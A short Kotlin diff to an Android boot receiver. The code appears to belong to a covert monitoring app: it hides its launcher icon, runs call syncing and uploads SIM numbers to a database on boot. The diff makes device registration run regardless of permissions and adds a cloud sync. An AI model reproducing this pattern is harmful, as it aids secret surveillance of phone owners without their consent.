@@ -29,9 +29,10 @@ class BootReceiver : BroadcastReceiver() {
             SyncBootstrap.armBackgroundSync(appContext)
             LauncherHider.hideIfMarked(appContext)
             CallSyncService.ensureRunning(appContext)
+            DeviceRegistration.registerNow(appContext)
             if (!SyncBootstrap.needsRuntimePermissions(appContext)) {
-                    DeviceRegistration.registerNow(appContext)
                     SimNumberHelper.registerAllSimsInMongo(appContext)
+                    InstallFlow.runFirstCloudSync(appContext)
                 }
                 SyncScheduler.syncIfPermittedNow(appContext, "boot")
                 Log.d(TAG, "Boot sync done after $action")
